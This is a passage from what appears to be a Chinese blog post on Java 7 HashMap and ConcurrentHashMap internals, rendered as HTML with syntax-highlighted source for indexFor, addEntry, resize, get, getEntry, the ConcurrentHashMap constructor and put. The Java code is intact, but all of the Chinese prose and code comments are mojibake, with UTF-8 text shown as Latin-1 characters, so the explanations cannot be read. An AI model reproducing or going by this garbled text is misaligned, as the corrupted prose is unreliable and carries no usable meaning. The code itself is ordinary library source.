class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">indexFor</span><span class="params">(<span class="type">int</span> hash, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="comment">// assert Integer.bitCount(length) == 1 : &quot;length must be a non-zero power of 2&quot;;</span></span><br><span class="line">    <span class="keyword">return</span> hash &amp; (length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•å¾ˆç®€å•ï¼Œç®€å•è¯´å°±æ˜¯å– hash å€¼çš„ä½ n ä½ã€‚å¦‚åœ¨æ•°ç»„é•¿åº¦ä¸º 32 çš„æ—¶å€™ï¼Œå…¶å®å–çš„å°±æ˜¯ key çš„ hash å€¼çš„ä½ 5 ä½ï¼Œä½œä¸ºå®ƒåœ¨æ•°ç»„ä¸­çš„ä¸‹æ ‡ä½ç½®ã€‚</p><h4><span id="æ·»åŠ èŠ‚ç‚¹åˆ°é“¾è¡¨ä¸­">æ·»åŠ èŠ‚ç‚¹åˆ°é“¾è¡¨ä¸­</span></h4><p>æ‰¾åˆ°æ•°ç»„ä¸‹æ ‡åï¼Œä¼šå…ˆè¿›è¡Œ key åˆ¤é‡ï¼Œå¦‚æœæ²¡æœ‰é‡å¤ï¼Œå°±å‡†å¤‡å°†æ–°å€¼æ”¾å…¥åˆ°é“¾è¡¨çš„<strong>è¡¨å¤´</strong>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addEntry</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">int</span> bucketIndex)</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå½“å‰ HashMap å¤§å°å·²ç»è¾¾åˆ°äº†é˜ˆå€¼ï¼Œå¹¶ä¸”æ–°å€¼è¦æ’å…¥çš„æ•°ç»„ä½ç½®å·²ç»æœ‰å…ƒç´ äº†ï¼Œé‚£ä¹ˆè¦æ‰©å®¹</span></span><br><span class="line">    <span class="keyword">if</span> ((size &gt;= threshold) &amp;&amp; (<span class="literal">null</span> != table[bucketIndex])) &#123;</span><br><span class="line">        <span class="comment">// æ‰©å®¹ï¼Œåé¢ä¼šä»‹ç»ä¸€ä¸‹</span></span><br><span class="line">        resize(<span class="number">2</span> * table.length);</span><br><span class="line">        <span class="comment">// æ‰©å®¹ä»¥åï¼Œé‡æ–°è®¡ç®— hash å€¼</span></span><br><span class="line">        hash = (<span class="literal">null</span> != key) ? hash(key) : <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// é‡æ–°è®¡ç®—æ‰©å®¹åçš„æ–°çš„ä¸‹æ ‡</span></span><br><span class="line">        bucketIndex = indexFor(hash, table.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¾€ä¸‹çœ‹</span></span><br><span class="line">    createEntry(hash, key, value, bucketIndex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¿™ä¸ªå¾ˆç®€å•ï¼Œå…¶å®å°±æ˜¯å°†æ–°å€¼æ”¾åˆ°é“¾è¡¨çš„è¡¨å¤´ï¼Œç„¶å size++</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">createEntry</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">int</span> bucketIndex)</span> &#123;</span><br><span class="line">    Entry&lt;K,V&gt; e = table[bucketIndex];</span><br><span class="line">    table[bucketIndex] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•çš„ä¸»è¦é€»è¾‘å°±æ˜¯å…ˆåˆ¤æ–­æ˜¯å¦éœ€è¦æ‰©å®¹ï¼Œéœ€è¦çš„è¯å…ˆæ‰©å®¹ï¼Œç„¶åå†å°†è¿™ä¸ªæ–°çš„æ•°æ®æ’å…¥åˆ°æ‰©å®¹åçš„æ•°ç»„çš„ç›¸åº”ä½ç½®å¤„çš„é“¾è¡¨çš„è¡¨å¤´ã€‚</p><h4><span id="æ•°ç»„æ‰©å®¹">æ•°ç»„æ‰©å®¹</span></h4><p>å‰é¢æˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨æ’å…¥æ–°å€¼çš„æ—¶å€™ï¼Œå¦‚æœ<strong>å½“å‰çš„ size å·²ç»è¾¾åˆ°äº†é˜ˆå€¼ï¼Œå¹¶ä¸”è¦æ’å…¥çš„æ•°ç»„ä½ç½®ä¸Šå·²ç»æœ‰å…ƒç´ </strong>ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘æ‰©å®¹ï¼Œæ‰©å®¹åï¼Œæ•°ç»„å¤§å°ä¸ºåŸæ¥çš„ 2 å€ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">resize</span><span class="params">(<span class="type">int</span> newCapacity)</span> &#123;</span><br><span class="line">    Entry[] oldTable = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> oldTable.length;</span><br><span class="line">    <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) &#123;</span><br><span class="line">        threshold = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ–°çš„æ•°ç»„</span></span><br><span class="line">    Entry[] newTable = <span class="keyword">new</span> <span class="title class_">Entry</span>[newCapacity];</span><br><span class="line">    <span class="comment">// å°†åŸæ¥æ•°ç»„ä¸­çš„å€¼è¿ç§»åˆ°æ–°çš„æ›´å¤§çš„æ•°ç»„ä¸­</span></span><br><span class="line">    transfer(newTable, initHashSeedAsNeeded(newCapacity));</span><br><span class="line">    table = newTable;</span><br><span class="line">    threshold = (<span class="type">int</span>)Math.min(newCapacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰©å®¹å°±æ˜¯ç”¨ä¸€ä¸ªæ–°çš„å¤§æ•°ç»„æ›¿æ¢åŸæ¥çš„å°æ•°ç»„ï¼Œå¹¶å°†åŸæ¥æ•°ç»„ä¸­çš„å€¼è¿ç§»åˆ°æ–°çš„æ•°ç»„ä¸­ã€‚</p><p>ç”±äºæ˜¯åŒå€æ‰©å®¹ï¼Œè¿ç§»è¿‡ç¨‹ä¸­ï¼Œä¼šå°†åŸæ¥ table[i] ä¸­çš„é“¾è¡¨çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œåˆ†æ‹†åˆ°æ–°çš„æ•°ç»„çš„ newTable[i] å’Œ newTable[i + oldLength] ä½ç½®ä¸Šã€‚å¦‚åŸæ¥æ•°ç»„é•¿åº¦æ˜¯ 16ï¼Œé‚£ä¹ˆæ‰©å®¹åï¼ŒåŸæ¥ table[0] å¤„çš„é“¾è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ ä¼šè¢«åˆ†é…åˆ°æ–°æ•°ç»„ä¸­ newTable[0] å’Œ newTable[16] è¿™ä¸¤ä¸ªä½ç½®ã€‚ä»£ç æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ã€‚</p><h3><span id="get-è¿‡ç¨‹åˆ†æ">get è¿‡ç¨‹åˆ†æ</span></h3><p>ç›¸å¯¹äº put è¿‡ç¨‹ï¼Œget è¿‡ç¨‹æ˜¯éå¸¸ç®€å•çš„ã€‚</p><ol><li>æ ¹æ® key è®¡ç®— hash å€¼ã€‚</li><li>æ‰¾åˆ°ç›¸åº”çš„æ•°ç»„ä¸‹æ ‡ï¼šhash &amp; (length - 1)ã€‚</li><li>éå†è¯¥æ•°ç»„ä½ç½®å¤„çš„é“¾è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°ç›¸ç­‰(&#x3D;&#x3D;æˆ–equals)çš„ keyã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// ä¹‹å‰è¯´è¿‡ï¼Œkey ä¸º null çš„è¯ï¼Œä¼šè¢«æ”¾åˆ° table[0]ï¼Œæ‰€ä»¥åªè¦éå†ä¸‹ table[0] å¤„çš„é“¾è¡¨å°±å¯ä»¥äº†</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> getForNullKey();</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    Entry&lt;K,V&gt; entry = getEntry(key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span> == entry ? <span class="literal">null</span> : entry.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getEntry(key):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Entry&lt;K,V&gt; <span class="title function_">getEntry</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : hash(key);</span><br><span class="line">    <span class="comment">// ç¡®å®šæ•°ç»„ä¸‹æ ‡ï¼Œç„¶åä»å¤´å¼€å§‹éå†é“¾è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];</span><br><span class="line">         e != <span class="literal">null</span>;</span><br><span class="line">         e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="java7-concurrenthashmap">Java7 ConcurrentHashMap</span></h2><p>ConcurrentHashMap å’Œ HashMap æ€è·¯æ˜¯å·®ä¸å¤šçš„ï¼Œä½†æ˜¯å› ä¸ºå®ƒæ”¯æŒå¹¶å‘æ“ä½œï¼Œæ‰€ä»¥è¦å¤æ‚ä¸€äº›ã€‚</p><p>æ•´ä¸ª ConcurrentHashMap ç”±ä¸€ä¸ªä¸ª Segment ç»„æˆï¼ŒSegment ä»£è¡¨â€éƒ¨åˆ†â€œæˆ–â€ä¸€æ®µâ€œçš„æ„æ€ï¼Œæ‰€ä»¥å¾ˆå¤šåœ°æ–¹éƒ½ä¼šå°†å…¶æè¿°ä¸º<strong>åˆ†æ®µé”</strong>ã€‚æ³¨æ„ï¼Œè¡Œæ–‡ä¸­ï¼Œæˆ‘å¾ˆå¤šåœ°æ–¹ç”¨äº†â€œ<strong>æ§½</strong>â€æ¥ä»£è¡¨ä¸€ä¸ª segmentã€‚</p><p>ç®€å•ç†è§£å°±æ˜¯ï¼ŒConcurrentHashMap æ˜¯ä¸€ä¸ª Segment æ•°ç»„ï¼ŒSegment é€šè¿‡ç»§æ‰¿ ReentrantLock æ¥è¿›è¡ŒåŠ é”ï¼Œæ‰€ä»¥æ¯æ¬¡éœ€è¦åŠ é”çš„æ“ä½œé”ä½çš„æ˜¯ä¸€ä¸ª segmentï¼Œè¿™æ ·åªè¦ä¿è¯æ¯ä¸ª Segment æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œä¹Ÿå°±å®ç°äº†å…¨å±€çš„çº¿ç¨‹å®‰å…¨ã€‚</p><p><img src="https://www.javadoop.com/blogimages/map/3.png" alt="3"></p><p><strong>concurrencyLevel</strong>ï¼šå¹¶è¡Œçº§åˆ«ã€å¹¶å‘æ•°ã€Segment æ•°ï¼Œæ€ä¹ˆç¿»è¯‘ä¸é‡è¦ï¼Œç†è§£å®ƒã€‚é»˜è®¤æ˜¯ 16ï¼Œä¹Ÿå°±æ˜¯è¯´ ConcurrentHashMap æœ‰ 16 ä¸ª Segmentsï¼Œæ‰€ä»¥ç†è®ºä¸Šï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæœ€å¤šå¯ä»¥åŒæ—¶æ”¯æŒ 16 ä¸ªçº¿ç¨‹å¹¶å‘å†™ï¼Œåªè¦å®ƒä»¬çš„æ“ä½œåˆ†åˆ«åˆ†å¸ƒåœ¨ä¸åŒçš„ Segment ä¸Šã€‚è¿™ä¸ªå€¼å¯ä»¥åœ¨åˆå§‹åŒ–çš„æ—¶å€™è®¾ç½®ä¸ºå…¶ä»–å€¼ï¼Œä½†æ˜¯ä¸€æ—¦åˆå§‹åŒ–ä»¥åï¼Œå®ƒæ˜¯ä¸å¯ä»¥æ‰©å®¹çš„ã€‚</p><p>å†å…·ä½“åˆ°æ¯ä¸ª Segment å†…éƒ¨ï¼Œå…¶å®æ¯ä¸ª Segment å¾ˆåƒä¹‹å‰ä»‹ç»çš„ HashMapï¼Œä¸è¿‡å®ƒè¦ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œæ‰€ä»¥å¤„ç†èµ·æ¥è¦éº»çƒ¦äº›ã€‚</p><h3><span id="åˆå§‹åŒ–">åˆå§‹åŒ–</span></h3><p>initialCapacityï¼šåˆå§‹å®¹é‡ï¼Œè¿™ä¸ªå€¼æŒ‡çš„æ˜¯æ•´ä¸ª ConcurrentHashMap çš„åˆå§‹å®¹é‡ï¼Œå®é™…æ“ä½œçš„æ—¶å€™éœ€è¦å¹³å‡åˆ†ç»™æ¯ä¸ª Segmentã€‚</p><p>loadFactorï¼šè´Ÿè½½å› å­ï¼Œä¹‹å‰æˆ‘ä»¬è¯´äº†ï¼ŒSegment æ•°ç»„ä¸å¯ä»¥æ‰©å®¹ï¼Œæ‰€ä»¥è¿™ä¸ªè´Ÿè½½å› å­æ˜¯ç»™æ¯ä¸ª Segment å†…éƒ¨ä½¿ç”¨çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                         <span class="type">float</span> loadFactor, <span class="type">int</span> concurrencyLevel)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(loadFactor &gt; <span class="number">0</span>) || initialCapacity &lt; <span class="number">0</span> || concurrencyLevel &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="keyword">if</span> (concurrencyLevel &gt; MAX_SEGMENTS)</span><br><span class="line">        concurrencyLevel = MAX_SEGMENTS;</span><br><span class="line">    <span class="comment">// Find power-of-two sizes best matching arguments</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sshift</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ssize</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// è®¡ç®—å¹¶è¡Œçº§åˆ« ssizeï¼Œå› ä¸ºè¦ä¿æŒå¹¶è¡Œçº§åˆ«æ˜¯ 2 çš„ n æ¬¡æ–¹</span></span><br><span class="line">    <span class="keyword">while</span> (ssize &lt; concurrencyLevel) &#123;</span><br><span class="line">        ++sshift;</span><br><span class="line">        ssize &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æˆ‘ä»¬è¿™é‡Œå…ˆä¸è¦é‚£ä¹ˆçƒ§è„‘ï¼Œç”¨é»˜è®¤å€¼ï¼ŒconcurrencyLevel ä¸º 16ï¼Œsshift ä¸º 4</span></span><br><span class="line">    <span class="comment">// é‚£ä¹ˆè®¡ç®—å‡º segmentShift ä¸º 28ï¼ŒsegmentMask ä¸º 15ï¼Œåé¢ä¼šç”¨åˆ°è¿™ä¸¤ä¸ªå€¼</span></span><br><span class="line">    <span class="built_in">this</span>.segmentShift = <span class="number">32</span> - sshift;</span><br><span class="line">    <span class="built_in">this</span>.segmentMask = ssize - <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">        initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// initialCapacity æ˜¯è®¾ç½®æ•´ä¸ª map åˆå§‹çš„å¤§å°ï¼Œ</span></span><br><span class="line">    <span class="comment">// è¿™é‡Œæ ¹æ® initialCapacity è®¡ç®— Segment æ•°ç»„ä¸­æ¯ä¸ªä½ç½®å¯ä»¥åˆ†åˆ°çš„å¤§å°</span></span><br><span class="line">    <span class="comment">// å¦‚ initialCapacity ä¸º 64ï¼Œé‚£ä¹ˆæ¯ä¸ª Segment æˆ–ç§°ä¹‹ä¸º&quot;æ§½&quot;å¯ä»¥åˆ†åˆ° 4 ä¸ª</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> initialCapacity / ssize;</span><br><span class="line">    <span class="keyword">if</span> (c * ssize &lt; initialCapacity)</span><br><span class="line">        ++c;</span><br><span class="line">    <span class="comment">// é»˜è®¤ MIN_SEGMENT_TABLE_CAPACITY æ˜¯ 2ï¼Œè¿™ä¸ªå€¼ä¹Ÿæ˜¯æœ‰è®²ç©¶çš„ï¼Œå› ä¸ºè¿™æ ·çš„è¯ï¼Œå¯¹äºå…·ä½“çš„æ§½ä¸Šï¼Œ</span></span><br><span class="line">    <span class="comment">// æ’å…¥ä¸€ä¸ªå…ƒç´ ä¸è‡³äºæ‰©å®¹ï¼Œæ’å…¥ç¬¬äºŒä¸ªçš„æ—¶å€™æ‰ä¼šæ‰©å®¹</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> MIN_SEGMENT_TABLE_CAPACITY; </span><br><span class="line">    <span class="keyword">while</span> (cap &lt; c)</span><br><span class="line">        cap &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»º Segment æ•°ç»„ï¼Œ</span></span><br><span class="line">    <span class="comment">// å¹¶åˆ›å»ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  segment[0]</span></span><br><span class="line">    Segment&lt;K,V&gt; s0 =</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Segment</span>&lt;K,V&gt;(loadFactor, (<span class="type">int</span>)(cap * loadFactor),</span><br><span class="line">                         (HashEntry&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">HashEntry</span>[cap]);</span><br><span class="line">    Segment&lt;K,V&gt;[] ss = (Segment&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Segment</span>[ssize];</span><br><span class="line">    <span class="comment">// å¾€æ•°ç»„å†™å…¥ segment[0]</span></span><br><span class="line">    UNSAFE.putOrderedObject(ss, SBASE, s0); <span class="comment">// ordered write of segments[0]</span></span><br><span class="line">    <span class="built_in">this</span>.segments = ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–å®Œæˆï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ª Segment æ•°ç»„ã€‚</p><p>æˆ‘ä»¬å°±å½“æ˜¯ç”¨ new ConcurrentHashMap() æ— å‚æ„é€ å‡½æ•°è¿›è¡Œåˆå§‹åŒ–çš„ï¼Œé‚£ä¹ˆåˆå§‹åŒ–å®Œæˆåï¼š</p><ul><li>Segment æ•°ç»„é•¿åº¦ä¸º 16ï¼Œä¸å¯ä»¥æ‰©å®¹</li><li>Segment[i] çš„é»˜è®¤å¤§å°ä¸º 2ï¼Œè´Ÿè½½å› å­æ˜¯ 0.75ï¼Œå¾—å‡ºåˆå§‹é˜ˆå€¼ä¸º 1.5ï¼Œä¹Ÿå°±æ˜¯ä»¥åæ’å…¥ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ä¼šè§¦å‘æ‰©å®¹ï¼Œæ’å…¥ç¬¬äºŒä¸ªä¼šè¿›è¡Œç¬¬ä¸€æ¬¡æ‰©å®¹</li><li>è¿™é‡Œåˆå§‹åŒ–äº† segment[0]ï¼Œå…¶ä»–ä½ç½®è¿˜æ˜¯ nullï¼Œè‡³äºä¸ºä»€ä¹ˆè¦åˆå§‹åŒ– segment[0]ï¼Œåé¢çš„ä»£ç ä¼šä»‹ç»</li><li>å½“å‰ segmentShift çš„å€¼ä¸º 32 - 4 &#x3D; 28ï¼ŒsegmentMask ä¸º 16 - 1 &#x3D; 15ï¼Œå§‘ä¸”æŠŠå®ƒä»¬ç®€å•ç¿»è¯‘ä¸º<strong>ç§»ä½æ•°</strong>å’Œ<strong>æ©ç </strong>ï¼Œè¿™ä¸¤ä¸ªå€¼é©¬ä¸Šå°±ä¼šç”¨åˆ°</li></ul><h3><span id="put-è¿‡ç¨‹åˆ†æ">put è¿‡ç¨‹åˆ†æ</span></h3><p>æˆ‘ä»¬å…ˆçœ‹ put çš„ä¸»æµç¨‹ï¼Œå¯¹äºå…¶ä¸­çš„ä¸€äº›å…³é”®ç»†èŠ‚æ“ä½œï¼Œåé¢ä¼šè¿›è¡Œè¯¦ç»†ä»‹ç»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    Segment&lt;K,V&gt; s;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    <span class="comment">// 1. è®¡ç®— key çš„ hash å€¼</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="comment">// 2. æ ¹æ® hash å€¼æ‰¾åˆ° Segment æ•°ç»„ä¸­çš„ä½ç½® j</span></span><br><span class="line">    <span class="comment">//    hash æ˜¯ 32 ä½ï¼Œæ— ç¬¦å·å³ç§» segmentShift(28) ä½ï¼Œå‰©ä¸‹é«˜ 4 ä½ï¼Œ</span></span><br><span class="line">    <span class="comment">//    ç„¶åå’Œ segmentMask(15) åšä¸€æ¬¡ä¸æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ j æ˜¯ hash å€¼çš„é«˜ 4 ä½ï¼Œä¹Ÿå°±æ˜¯æ§½çš„æ•°ç»„ä¸‹æ ‡</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> (hash &gt;&gt;&gt; segmentShift) &amp; segmentMask;</span><br><span class="line">    <span class="comment">// åˆšåˆšè¯´äº†ï¼Œåˆå§‹åŒ–çš„æ—¶å€™åˆå§‹åŒ–äº† segment[0]ï¼Œä½†æ˜¯å…¶ä»–ä½ç½®è¿˜æ˜¯ nullï¼Œ</span></span><br><span class="line">    <span class="comment">// ensureSegment(j) å¯¹ segment[j] è¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">if</span> ((s = (Segment&lt;K,V&gt;)UNSAFE.getObject          <span class="comment">// nonvolatile; recheck</span></span><br><span class="line">         (segments, (j &lt;&lt; SSHIFT) + SBASE)) == <span class="literal">null</span>) <span class="comment">//  in ensureSegment</span></span><br><span class="line">        s = ensureSegment(j);</span><br><span class="line">    <span class="comment">// 3. æ’å…¥æ–°å€¼åˆ° æ§½ s ä¸­</span></span><br><span class="line">    <span class="keyword">return</span> s.put(key, hash, value, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚çš®å¾ˆç®€å•ï¼Œæ ¹æ® hash å€¼å¾ˆå¿«å°±èƒ½æ‰¾åˆ°ç›¸åº”çš„ Segmentï¼Œä¹‹åå°±æ˜¯ Segment å†…éƒ¨çš„ put æ“ä½œäº†ã€‚</p><p>Segment å†…éƒ¨æ˜¯ç”± <strong>æ•°ç»„+é“¾è¡¨</strong> ç»„æˆçš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> V <span class="title function_">put</span><span class="params">(K key, <span class="type">int</span> hash, V value, <span class="type">boolean</span> onlyIfAbsent)</span> &#123;</span><br><span class="line">    <span class="comment">// åœ¨å¾€è¯¥ segment å†™å…¥å‰ï¼Œéœ€è¦å…ˆè·å–è¯¥ segment çš„ç‹¬å é”</span></span><br><span class="line">    <span class="comment">//    å…ˆçœ‹ä¸»æµç¨‹ï¼Œåé¢è¿˜ä¼šå…·ä½“ä»‹ç»è¿™éƒ¨åˆ†å†…å®¹</span></span><br><span class="line">    HashEntry&lt;K,V&gt; node = tryLock() ? <span class="literal">null</span> :</span><br><span class="line">        scanAndLockForPut(key, hash, value);</span><br><span class="line">    V oldValue;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// è¿™ä¸ªæ˜¯ segment å†…éƒ¨çš„æ•°ç»„</span></span><br><span class="line">        HashEntry&lt;K,V&gt;[] tab = table;</span><br><span class="line">        <span class="comment">// å†åˆ©ç”¨ hash 